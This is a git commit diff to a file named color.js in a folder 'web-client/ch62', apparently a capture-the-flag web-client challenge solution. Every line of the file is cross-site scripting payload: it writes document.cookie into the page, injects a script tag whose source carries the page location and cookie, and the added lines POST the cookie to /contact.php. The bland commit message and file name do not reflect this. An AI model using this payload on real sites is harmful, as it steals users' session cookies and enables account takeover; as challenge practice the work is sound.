120e12222bc3d73da7e78d6927908d4306a118ce
blaisedubs6 <104782871+blaisedubs6@users.noreply.github.com>
2026-04-09 18:06:53 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,4 +1,14 @@
 document.write(document.cookie);
 document.write('<script SRC = "coucou'+'location='+document.location+'&cookie='+document.cookie+'" nonce></script>');
 
+fetch('/contact.php', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    contenu: document.cookie
+  })
+})
+
 
